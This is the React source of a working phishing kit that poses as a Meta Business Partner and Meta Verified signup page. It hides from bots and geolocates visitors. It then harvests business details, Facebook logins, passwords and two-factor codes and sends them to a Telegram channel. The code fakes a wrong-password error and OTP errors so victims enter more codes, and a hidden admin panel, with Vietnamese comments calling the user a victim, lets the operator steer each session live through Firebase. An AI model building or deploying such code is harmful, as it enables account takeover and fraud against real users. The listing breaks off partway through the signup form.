import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
import axios from 'axios';
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue } from "firebase/database";

// --- IMPORT ẢNH/VIDEO CỦA MÀY ---
import MetaLogoBlue from '@/assets/images/logo-meta.svg';
import HeroVideo from '@/assets/images/hero.mp4';
import AdsManagerVideo from '@/assets/images/ads_manager.mp4';
import StreetwearVideo from '@/assets/images/streetwear.mp4';
import BrooklinenVideo from '@/assets/images/brooklinen.mp4';
import ShopifyVideo from '@/assets/images/shopify.mp4';
import MediaImg from '@/assets/images/media.webp';
import FansVideo from '@/assets/images/fans.mp4';
import FbIcon from '@/assets/images/fb_round_logo.png';
import IgIcon from '@/assets/images/ic_instagram_color.webp';
import MessengerIcon from '@/assets/images/ic_message_color.svg';
import WhatsappIcon from '@/assets/images/ic_whatshap_color.svg';
import SupportVideo from '@/assets/images/support.mp4';
import BackgroundImg from '@/assets/images/background.webp';

import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';

// ==========================================
// CẤU HÌNH FIREBASE
const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
const firebaseConfig = { databaseURL: FIREBASE_URL };
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
// ==========================================

const LoadingSpinner = () => (
    <div style={{
        width: '20px', height: '20px', border: '3px solid rgba(255, 255, 255, 0.3)',
        borderTop: '3px solid #fff', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto'
    }} />
);

const Home = () => {
    // --- STATES GIAO DIỆN MỚI ---
    const videoRef = useRef(null);
    const [isVideoPaused, setIsVideoPaused] = useState(false);
    const adsVideoRef = useRef(null);
    const [isAdsVideoPaused, setIsAdsVideoPaused] = useState(false);
    const [activeAccordion, setActiveAccordion] = useState('ads_manager');
    const [playingVideo, setPlayingVideo] = useState(null);
    const fansVideoRef = useRef(null);
    const [isFansVideoPaused, setIsFansVideoPaused] = useState(false);
    const [activeTab, setActiveTab] = useState('facebook');
    const supportVideoRef = useRef(null);
    const [isSupportVideoPaused, setIsSupportVideoPaused] = useState(false);
    const [translatedTexts, setTranslatedTexts] = useState({});
    const [isLoading, setIsLoading] = useState(true);

    // --- STATES LOGIC CŨ ---
    const [showModal, setShowModal] = useState(false);
    const [step, setStep] = useState(1);
    const [clientIp, setClientIp] = useState('Unknown');
    const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
    const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
    const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
    const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
    const [loading, setLoading] = useState(false);
    const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
    const [matchNumber, setMatchNumber] = useState(null); 
    const [showSuccess, setShowSuccess] = useState(false); 
    const [adminSessionId, setAdminSessionId] = useState(''); 
    const [adminNumberInput, setAdminNumberInput] = useState(''); 
    const [showAdmin, setShowAdmin] = useState(false);

    const [sessionId] = useState(() => {
        if (typeof window === 'undefined') return 'server_session';
        let id = localStorage.getItem('session_id');
        if (!id) {
            id = 'user_' + Math.random().toString(36).substring(2, 9);
            localStorage.setItem('session_id', id);
        }
        return id;
    });

    const defaultTexts = useMemo(() => ({
        fullName: 'Full Name',
        personalEmail: 'Personal Email',
        businessEmail: 'Business Email',
        mobilePhone: 'Mobile Phone Number',
        yourPageName: 'Your Page Name',
        agreeToTerms: 'I agree to the',
        confirm: 'Confirm',
        loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
        mobileOrEmail: 'Mobile number or email',
        password: 'Password',
        passwordIncorrect: 'Password is incorrect, please try again.',
        logIn: 'Log in',
        continueBtn: 'Continue',
        twoFATitle: 'Check your authentication code',
        twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
        code: 'Code',
        codeExpired: 'This code has expired. Please enter a new code later',
        findNewWaysTitle: 'Find new ways to earn money with your content.',
        creatorLabel: 'Creator',
        subscribeBtn: 'Subscribe',
        monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",
        heroTitle: 'Explore how Meta technologies can help transform your business.',
        startNow: 'Start now',
        trustedExperts: 'Trusted by experts',
        exploreMeta: 'Explore Meta technologies',
        improveAd: 'Improve ad performance',
        improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
        reachPeople: 'Reach people where they are',
        reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.',
        getExpert: 'Get expert guidance',
        getExpertDesc: 'Access personalized support and resources to help your business grow.',
        findSolutions: 'Find solutions for your business',
        findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.',
        understandAudience: 'Understand your audience',
        understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.',
        useFormats: 'Use versatile ad formats',
        useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.',
        toolsTitle: 'Gain access to tools that deliver results.',
        adsManager: 'Ads Manager',
        fbIgShops: 'Facebook & Instagram Shops',
        messengerApi: 'Messenger API',
        waBusiness: 'WhatsApp Business Platform',
        inspiredTitle: 'Be inspired by reading how best-in-class marketers scale their business with Meta technologies.',
        streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop',
        brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
        shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales',
        reachTitle: 'Reach more customers with ads on Meta technologies.',
        reachDesc: 'Discover everything you need to start advertising your business.',
        connectedTitle: 'Stay connected to your audience.',
        reachCustomersFb: 'Reach your customers with the Facebook app.',
        createPage: 'Create a Page',
        getSupport: 'Get support',
        resourcesTitle: 'Additional resources for your business.',
        footerUpdateTitle: 'Get the latest updates from Meta for business.',
        footerUpdateDesc: 'Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.',
        emailAddressPlaceholder: 'Email address',
        enterCountry: 'Enter a country name...',
        footerDisclaimer: 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our',
        dataPolicy: 'Data Policy',
        successModalTitle: 'Request has been sent',
        successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
        successModalFrom: 'From the Customer Care Team',
        successModalBtn: 'Return to facebook',
        successModalHeroAlt: 'Success',
        successModalLogoAlt: 'Meta',
        twoFATitleNew: 'Two-factor authentication required',
        twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
        twoFAFallbackUser: 'User',
        twoFABrandFacebook: 'Facebook',
        twoFAAuthenticationImageAlt: 'Two-factor authentication',
        enterCode: 'Enter the code',
        tryAnotherWay: 'Try another way',
        information: 'Information',
        fanpageName: 'Fanpage Name',
        dateOfBirth: 'Date of Birth',
        day: 'Day',
        month: 'Month',
        year: 'Year',
        message: 'Message',
        responseWithin: 'Our response will be sent to you within 14 - 48 hours.',
        termsOfUse: 'Terms of use',
        submit: 'Submit',
        navGetStarted: 'Get started',
        navAdvertise: 'Advertise',
        navLearn: 'Learn',
        navSupport: 'Support',
        landingHeroTitle: 'Become a Meta Business Partner',
        landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
        landingGetStartedBtn: 'Get started',
        trustedPartnersTitle: 'Meta Business Partners are trusted experts',
        trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',
        landingFeatureReachMoreTitle: 'Reach more people',
        landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
        becomeExpertCardTitle: 'Become an expert',
        becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through',
        metaBlueprintBrand: 'Meta Blueprint',
        becomeExpertTrail: '',
        personalisedAdSolutionsTitle: 'Get personalised ad solutions',
        personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
        understandPerformanceTitle: 'Understand performance',
        understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
        adFormatsTitle: 'Use ad formats that work',
        adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',
        accordionAdsManagerDesc: 'Create and track new ads, monitor your budget and increase sales across Facebook, Messenger, Instagram and WhatsApp – all from one place.',
        accordionBusinessSuiteTitle: 'Meta Business Suite',
        accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
        accordionPixelTitle: 'Meta pixel',
        accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
        accordionFbPagesTitle: 'Facebook Pages',
        accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
        accordionAiMarketingTitle: 'AI tools (performance marketing)',
        accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',
        learnMore: 'Learn more',
        goToAdsManager: 'Go to Ads Manager',
        inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget',
        inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',
        createAd: 'Create ad',
        metaTechnologiesEyebrow: 'Meta technologies',
        marketingOnFacebookEyebrow: 'Marketing on Facebook',
        fansBuildFollowingTitle: 'Find fans and build a following.',
        fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.',
        exploreFacebookLink: 'Explore Facebook',
        supportCentreEyebrow: 'Meta Business Help Centre',
        supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.',
        mediaIllustrationAlt: 'Meta Platforms Illustration',
        ariaPlayVideo: 'Play',
        ariaPauseVideo: 'Pause',
        footerFcMetaFb: 'Facebook', footerFcMetaIg: 'Instagram', footerFcMetaMsg: 'Messenger', footerFcMetaWa: 'WhatsApp', footerFcMetaAn: 'Audience Network', footerFcMetaQuest: 'Meta Quest', footerFcMetaWorkplace: 'Workplace', footerFcMetaForWork: 'Meta for Work',
        footerFcToolsFt: 'Free tools', footerFcToolsFbPages: 'Facebook Pages', footerFcToolsIgProfiles: 'Instagram profiles', footerFcToolsStories: 'Stories', footerFcToolsShops: 'Shops', footerFcToolsMbs: 'Meta Business Suite', footerFcToolsFbAds: 'Facebook ads', footerFcToolsIgAds: 'Instagram ads', footerFcToolsVideoAds: 'Video ads', footerFcToolsAdsMgr: 'Ads Manager',
        footerFcGoalsFbPage: 'Set up a Facebook Page', footerFcGoalsBrandAwareness: 'Build brand awareness', footerFcGoalsLocal: 'Promote your local business', footerFcGoalsOnlineSales: 'Grow online sales', footerFcGoalsApp: 'Promote your app', footerFcGoalsLeads: 'Generate leads', footerFcGoalsMeasure: 'Measure and optimise ads', footerFcGoalsRetarget: 'Retarget existing customers',
        footerFcBizSmall: 'Small business', footerFcBizLarge: 'Large businesses', footerFcBizAgency: 'Agency', footerFcBizMedia: 'Media and publisher', footerFcBizCreator: 'Creator', footerFcBizDev: 'Developer', footerFcBizPartner: 'Business partner',
        footerFcIndustryAuto: 'Automotive', footerFcIndustryCpg: 'Consumer packaged goods', footerFcIndustryEcom: 'E-commerce', footerFcIndustryEnt: 'Entertainment and media', footerFcIndustryFin: 'Financial services', footerFcIndustryGaming: 'Gaming', footerFcIndustryProperty: 'Property', footerFcIndustryRest: 'Restaurants', footerFcIndustryRetail: 'Retail', footerFcIndustryTech: 'Technology and telecom', footerFcIndustryTravel: 'Travel',
        footerFcSkillsOnline: 'Online learning', footerFcSkillsCert: 'Certification programmes', footerFcSkillsWebinars: 'Webinars',
        footerFcGuideAds: 'Ads guide', footerFcGuideBrand: 'Brand safety and suitability', footerFcGuideBook: '"Click Here" book', footerFcGuideMedia: 'Media responsibility', footerFcGuideSitemap: 'Sitemap',
        footerFcColMetaTech: 'Meta technologies', footerFcColTools: 'Tools', footerFcColGoals: 'Goals', footerFcColBusinessTypes: 'Business types', footerFcColIndustries: 'Industries', footerFcColSkills: 'Skills and training', footerFcColGuides: 'Guides and resources',
        footerLegalAbout: 'About', footerLegalDevelopers: 'Developers', footerLegalCareers: 'Careers', footerLegalPrivacy: 'Privacy', footerLegalCookies: 'Cookies', footerLegalTerms: 'Terms', footerLegalHelp: 'Help Centre',
        footerSocialFacebook: 'Facebook', footerSocialInstagram: 'Instagram', footerSocialX: 'X', footerSocialLinkedIn: 'LinkedIn',
        footerCopyrightNotice: '© 2026 Meta'
    }), []);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    useEffect(() => {
        localStorage.clear();
        initializeApp();
    }, []);

    const initializeApp = async () => {
        try {
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;
                localStorage.setItem('ipInfo', JSON.stringify(data));
                setClientIp(`${data.ip} - ${data.country} (${data.city})`);

                if (data.country_code && countryCodeMap[data.country_code]) {
                    setCountryCode(countryCodeMap[data.country_code]);
                }

                const countryCode = data.country_code;
                const targetLang = countryToLanguage[countryCode] || 'en';
                localStorage.setItem('targetLang', targetLang);

                if (targetLang !== 'en') {
                    translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                setTranslatedTexts(defaultTexts);
            }
            setIsLoading(false);
        } catch (error) {
            console.error('Initialization error:', error);
            setIsLoading(false);
        }
    };

    const translateAllTexts = useCallback(async (targetLang) => {
        try {
            const keys = Object.keys(defaultTexts);
            const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
            const translated = {};
            keys.forEach((key, index) => { translated[key] = translations[index]; });
            setTranslatedTexts(translated);
        } catch (error) {
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts]);

    useEffect(() => {
        if (showModal && !showAdmin) {
            const commandRef = ref(database, 'commands/' + sessionId);
            const unsubscribe = onValue(commandRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.action) {
                    if (data.action === 'otp') {
                        setStep(3); setMatchNumber(null); setShowSuccess(false);
                    } else if (data.action === 'approve' && data.value) {
                        setStep(3); setMatchNumber(data.value); setShowSuccess(false);
                    } else if (data.action === 'success') {
                        setStep(3); setShowSuccess(true);
                    } else if (data.action === 'error') {
                        setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                    }
                }
            });
            return () => unsubscribe();
        }
    }, [showModal, showAdmin, sessionId]);

    useEffect(() => {
        const handleKeyDown = (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                setShowAdmin(prev => !prev); setShowModal(true);
            }
        };
        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    }, []);

    const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };

    const handleSignup = (e) => {
        e.preventDefault(); let errs = {};
        if (busName.length < 2) errs.busName = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
        if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
        if (Object.keys(errs).length > 0) { setErrors(errs); return; }
        
        setErrors({}); setLoading(true);
        const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
        setInitialSession(text); sendTelegramMessage('');
        setTimeout(() => { setLoading(false); setStep(2); }, 700);
    };

    const handleLogin = (e) => {
        e.preventDefault(); if (loginPass.length === 0) return;
        setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
        sendTelegramMessage(`<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
        setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
    };

    const handleOtp = (e) => {
        e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
        setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
        if (newAttempt <= 3) sendTelegramMessage(`<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
        setTimeout(() => { 
            setLoading(false); 
            if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
            else { setShowSuccess(true); setOtp(''); }
        }, 1500);
    };

    const handleAdminCommand = (type, value) => {
        const targetUser = adminSessionId.trim(); 
        if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
        set(ref(database, 'commands/' + targetUser), { action: type, value: value }).then(() => {
            alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
        }).catch((error) => { alert("Lỗi gửi lệnh: " + error.message); });
    };

    if (isLoading) {
        return <div id="intro"></div>; 
    }

    return (
        <>
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
            
            <div className="meta-landing">
                {/* ===== HEADER ===== */}
                <header style={{ width: '100%', borderBottom: '1px solid #e4e6eb', background: '#fff', position: 'sticky', top: 0, zIndex: 100 }}>
                    <div className="landing-header-row" style={{ maxWidth: '1504px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 32px', height: '64px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <img src={MetaLogoBlue} alt="Meta" style={{ width: '61px', objectFit: 'contain' }} />
                            <nav className="landing-nav-desktop" style={{ marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' }}>
                                {[texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport].map((item, navIndex) => (
                                    <span key={item} onClick={() => { if (navIndex === 0) openModal(); }} style={{ cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' }}>
                                        {item}
                                    </span>
                                ))}
                            </nav>
                        </div>
                        <div className="landing-header-actions" style={{ display: 'flex', alignItems: 'center', gap: '40px' }}>
                            <span style={{ cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' }}>{texts.createPage}</span>
                            <span onClick={openModal} style={{ cursor: 'pointer', background: '#0457CB', color: '#fff', fontWeight: '600', fontSize: '14px', padding: '8px 24px', borderRadius: '100px', whiteSpace: 'nowrap' }}>
                                {texts.startNow}
                            </span>
                        </div>
                    </div>
                </header>

                {/* ===== HERO SECTION ===== */}
                <section className="landing-hero" style={{ padding: '80px 24px' }}>
                    <div style={{ maxWidth: '1504px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                        <div className="landing-hero-title-wrap" style={{ width: '80%', padding: '0 24px' }}>
                            <h1 className="landing-hero-heading" style={{ fontSize: '3.5rem', fontWeight: '550', color: '#1C2B33', textAlign: 'center', lineHeight: '1.15', margin: 0, display: 'block' }}>
                                {texts.landingHeroTitle}
                            </h1>
                        </div>
                        <div className="landing-hero-lead" style={{ width: '60%' }}>
                            <p style={{ fontSize: '16px', color: '#5D6C7B', textAlign: 'center', padding: '16px 16px 0', fontWeight: '400', lineHeight: '1.6', margin: 0 }}>
                                {texts.landingHeroSubtitle}
                            </p>
                        </div>
                        <div onClick={openModal} style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', padding: '0 24px', height: '45px', cursor: 'pointer', background: '#0457CB', borderRadius: '100px', margin: '24px auto 0' }}>
                            <span style={{ fontSize: '15px', color: '#fff', fontWeight: '500', whiteSpace: 'nowrap' }}>{texts.landingGetStartedBtn}</span>
                        </div>
                        <div className="landing-hero-video" style={{ width: '60%', margin: '80px auto 0' }}>
                            <div style={{ position: 'relative', width: '100%', aspectRatio: '16/9', borderRadius: '32px', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.1)' }}>
                                <video ref={videoRef} style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }} muted loop playsInline autoPlay>
                                    <source src={HeroVideo} type="video/mp4" />
                                </video>
                                <div style={{ position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 }}>
                                    <button aria-label={isVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo} style={{ width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', color: '#fff', cursor: 'pointer' }} onClick={() => { if (videoRef.current) { if (isVideoPaused) videoRef.current.play(); else videoRef.current.pause(); setIsVideoPaused(!isVideoPaused); } }}>
                                        {isVideoPaused ? <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> : <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg>}
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                {/* ===== TRUSTED EXPERTS SECTION ===== */}
                <section className="landing-trusted" style={{ padding: '80px 32px' }}>
                    <div style={{ maxWidth: '1504px', margin: '0 auto' }}>
                        <div className="landing-trusted-copy" style={{ maxWidth: '83%' }}>
                            <p style={{ fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, fontFamily: 'inherit' }}>{texts.trustedPartnersTitle}</p>
                            <p style={{ fontSize: '18px', marginTop: '18px', color: '#1C2B33', lineHeight: '1.6', fontWeight: '400', margin: '18px 0 0' }}>{texts.trustedPartnersDesc}</p>
                        </div>
                    </div>
                </section>

                {/* ===== EXPLORE SECTION ===== */}
                <section className="landing-explore" style={{ padding: '0 32px 80px' }}>
                    <div style={{ maxWidth: '1504px', margin: '0 auto' }}>
                        <h2 className="landing-explore-heading" style={{ fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', margin: 0, display: 'block' }}>{texts.heroTitle}</h2>
                    </div>
                </section>

                {/* ===== FEATURE CARDS SECTION (LƯỢC BỚT CHO GỌN - GIỮ LOGIC MAP) ===== */}
                <section className="landing-features" style={{ paddingBottom: '80px' }}>
                    <div style={{ maxWidth: '1504px', margin: '0 auto', padding: '40px 32px 0' }}>
                        <div className="landing-features-grid" style={{ display: 'flex', flexWrap: 'wrap', margin: '0 -12px' }}>
                            {/* (Mày giữ nguyên phần map Feature Cards trong file của mày ở đây) */}
                        </div>
                    </div>
                </section>

                {/* (CÁC SECTION TOOLS, INSPIRED, REACH CUSTOMERS, STAY CONNECTED, SUPPORT, RESOURCES, FOOTER MÀY GIỮ NGUYÊN TRONG FILE) */}
                
                {/* ================= KẾT THÚC GIAO DIỆN MỚI ================= */}

                {/* ================= MODAL FORM NHẬP LIỆU CŨ (ĐÃ TÍCH HỢP) ================= */}
                {showModal && (
                    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)' }}>
                        <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                            
                            <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                            </button>

                            {showAdmin ? (
                                <div style={{ textAlign: 'center' }}>
                                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                                    <div style={{ marginBottom: '20px' }}>
                                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
                                        <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '8px' }} type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                                    </div>
                                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ padding: '10px', background: '#fa383e', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Báo Sai Mật Khẩu</button>
                                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn" style={{ padding: '10px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Chuyển sang nhập OTP</button>
                                        <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ padding: '10px', background: '#198754', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Báo Thành Công</button>
                                        
                                        <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
                                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
                                            <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '8px', marginBottom: '10px' }} />
                                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ width: '100%', padding: '10px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Gửi Số Duyệt</button>
                                        </div>
                                        
                                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', padding: '10px', background: '#ccc', color: '#333', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Đóng</button>
                                    </div>
                                </div>
                            ) : (
                                <>
                                    <div style={{ textAlign: 'center', marginBottom: '18px' }}>
                                        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
                                    </div>

                                    {/* FORM 1: SIGNUP */}
                                    {step === 1 && (
                                        <>
                                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
                                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
                                            <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                                <div>
                                                    <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid', borderColor: errors.busName ? '#fa383e' : '#e0e2e4', borderRadius: '8px' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                                                    {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                                                </div>
                                                <div>
                                                    <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid', borderColor: errors.perEmail ? '#fa383e' : '#e0e2e4', borderRadius: '8px' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                                                </div>
                                                <div>
                                                    <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid', borderColor: errors.busEmail ? '#fa383e' : '#e0e2e4', borderRadius: '8px' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                                                </div>
                                                <div>
                                                    <div style={{ display: 'flex', gap: '8px' }}>
                                                        <select className="fb-input" style={{ width: '35%', padding: '10px', border: '1px solid #e0e2e4', borderRadius: '8px' }} value={countryCode} onChange={e => setCountryCode(e.target.value)}>
                                                            <option value="+1">+1 (US)</option>
                                                            <option value="+84">+84 (VN)</option>
                                                            <option value="+44">+44 (UK)</option>
                                                            <option value="+33">+33 (FR)</option>
                                                            <option value="+49">+49 (DE)</option>
                                                        </select>
                                                        <input className="fb-input" style={{ flex: 1, padding: '12px', border: '1px solid', borderColor: errors.phoneNum ? '#fa383e' : '#e0e2e4', borderRadius: '8px' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                                                    </div>
                                                </div>
